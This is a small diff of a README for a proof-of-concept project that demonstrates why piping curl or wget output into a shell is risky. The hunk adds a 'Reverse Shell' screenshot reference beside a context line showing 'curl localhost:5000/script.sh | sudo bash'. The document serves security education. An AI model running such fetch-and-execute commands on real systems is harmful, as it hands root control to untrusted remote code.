@@ -13,6 +13,7 @@ Proof of Concept why piping from curl/wget to shell is asking for trouble. Flask
 	OR
 	* `curl localhost:5000/script.sh | sudo bash `
 
+![Reverse Shell](./images/reverse_shell.png)
 
 ## Remedy
 
